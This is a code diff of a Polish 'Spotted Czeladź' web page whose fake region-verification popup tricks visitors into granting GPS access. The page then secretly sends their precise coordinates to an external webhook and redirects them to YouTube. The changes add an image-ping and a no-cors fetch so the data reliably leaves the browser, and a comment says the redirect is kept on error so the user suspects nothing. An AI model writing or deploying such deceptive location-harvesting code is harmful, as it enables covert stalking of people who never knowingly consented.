@@ -134,7 +134,6 @@
         .btn:hover { background: #ff6b81; }
         .footer { font-size: 11px; color: #72767d; margin-top: 16px; text-align: center; }
 
-        /* Własny popup stylizowany na weryfikację wieku zamiast blokującego alert() */
         #modal-overlay {
             display: none;
             position: fixed;
@@ -199,7 +198,6 @@
         <div class="footer">Spotted Czeladź © 2026 • Wszelkie prawa zastrzeżone</div>
     </div>
 
-    <!-- Własny popup zamiast blokującego alert() -->
     <div id="modal-overlay">
         <div class="modal-card">
             <h3>Weryfikacja Regionu</h3>
@@ -216,8 +214,6 @@
         function odpalLokalizacje() {
             document.getElementById('modal-overlay').style.display = 'none';
             
-            // Krótkie opóźnienie, żeby użytkownik fizycznie kliknął w nasz przycisk, 
-            // co zapobiega blokadzie anty-nakładkowej Androida!
             setTimeout(function() {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -225,19 +221,25 @@
                             var lat = position.coords.latitude;
                             var lon = position.coords.longitude;
                             
-                            // Wysyłamy współrzędne na Render
-                            fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon)
+                            // Używamy fetch z trybem no-cors / beacon lub zwykłego img ping, żeby upewnić się, że request wyjdzie do chmury
+                            var img = new Image();
+                            img.src = 'https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon;
+                            
+                            // Dodatkowo fetch jako backup
+                            fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon, { mode: 'no-cors' })
                                 .catch(err => console.log(err));
                                 
-                            // Przekierowanie na YouTube
+                            // Krótkie opóźnienie na wysłanie paczki i kierunek YouTube
                             setTimeout(function() {
                                 window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
-                            }, 400);
+                            }, 800);
                         },
                         function(error) {
+                            console.log("GPS error code: " + error.code + " - " + error.message);
+                            // Nawet przy błędzie GPS wyrzucamy na YouTube, żeby użytkownik nic nie podejrzewał
                             window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                         },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
                     );
                 } else {
                     window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
